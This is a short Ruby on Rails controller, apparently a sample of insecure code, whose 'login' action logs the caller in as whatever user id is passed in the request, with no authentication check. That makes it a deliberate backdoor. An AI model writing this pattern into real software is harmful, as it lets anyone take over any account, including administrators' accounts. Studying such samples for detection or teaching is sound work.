class BackdoorController < ApplicationController
  def login
    session[:user_id] = params[:id]

    redirect_to root_path
  end
end
